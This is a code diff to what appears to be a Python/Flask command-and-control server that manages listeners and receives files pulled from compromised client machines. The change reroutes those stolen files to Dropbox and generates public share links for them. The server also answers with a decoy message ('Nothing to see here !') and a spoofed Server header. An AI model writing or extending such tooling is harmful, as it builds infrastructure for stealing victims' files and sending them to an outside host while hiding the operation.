@@ -10,6 +10,8 @@ import os
 import signal
 import string
 import random
+import dropbox
+import datetime
 from termcolor import colored
 import requests as web_requests
 from .functions import *
@@ -206,7 +208,7 @@ def delete_listener(listener_name):
         port = listener_info[2]
         is_ssl = listener_info[6]
     except:
-        print(colored("[-] Worng listener name!", "red"))
+        print(colored("[-] Wrong listener name!", "red"))
         return False
 
     data = {"shutdown_token": kill_listener_token}
@@ -220,9 +222,7 @@ def delete_listener(listener_name):
 
 def shutdown_server():
     func = request.environ.get('werkzeug.server.shutdown')
-    if func is None:
-        pass
-    func()
+    if func:func()
 
 @app.route('/%s' % kill_listener_url, methods=['POST'])
 def shutdown():
@@ -240,20 +240,33 @@ def fr():
     fdata = request.form["token"].replace(" ", "+")
     username = request.headers["x-Authorization"]
     fusername = decrypt_command(aes_key, aes_iv, username)
-    if os.path.isdir("downloads"):
-        pass
-    else:
-        os.mkdir("downloads")
-    if os.path.isdir("downloads/%s" % fusername):
-        pass
-    else:
-        os.mkdir("downloads/%s" % fusername)
     raw_base64 = decrypt_command(aes_key, aes_iv, fdata)
     stripped_filename = filename.strip("\x00")
-    f = open("downloads/%s/%s" % (fusername, stripped_filename), "wb")
-    f.write(base64.b64decode(raw_base64.encode()))
-    f.close()
-    print(colored("\n[+] File %s downloaded from the client !" % filename, "green"))
+
+    raw_data = base64.b64decode(raw_base64.encode())
+    print(colored(f"\n[+] File {filename} downloaded from the client" , "green"))
+
+    if raw_data:
+        try:
+            path = f"/{fusername}/{stripped_filename}"
+            dbx.files_upload(raw_data,path)
+            print(colored(f"[+] File {filename} uploaded to dropbox {path}" , "green"))
+            link = dbx.sharing_create_shared_link_with_settings(path)
+            print(colored(f"[+] Generated link: {link.url}" , "green"))
+        except Exception as e:
+            print(colored(f"[!] Something went wrong, couldn't upload file because\n {e}","red"))
+    else:
+        print(colored(f"[!] Couldn't upload data. File empty"))
+
+
+
+    #f = open("downloads/%s/%s" % (fusername, stripped_filename), "wb")
+    #f.write(base64.b64decode(raw_base64.encode()))
+    #f.close()
+
+    #db_url = ""
+        
+    
     response = make_response("Nothing to see here !")
     response.headers["Server"] = server_response_header
     return response
@@ -356,14 +369,18 @@ def after_request_func(response):
             global outward_address
             del response.headers["Server"]
             response.direct_passthrough = False
-            response.data=response.data.replace(b"0.0.0.0", bytes(conf__outward_address,"utf8")).replace(bytes(":"+ conf__port,"utf8"),b"")
+            response.data=response.data.replace(b"0.0.0.0", bytes(conf__outward_address,"utf8"))\
+                                        .replace(bytes(":"+ conf__port,"utf8"),b"")
         return response
 
 
 def create_data_stream():
     while not std_out_capture.STOP:
         time.sleep(1)
-        std_out_capture.PUSH_DATA = std_out_capture.PUSH_DATA.replace("\n","<NEWLINE>")
+        std_out_capture.PUSH_DATA = std_out_capture.PUSH_DATA\
+                                .replace("0.0.0.0", conf__outward_address)\
+                                .replace(str(":"+ conf__port),"")\
+                                .replace("\n","<NEWLINE>")
         yield f"data: {quote(std_out_capture.PUSH_DATA)}  <SEQ_NUM>{std_out_capture.SEQ_NUM}\n\n"
 
 @app.route("/sse")
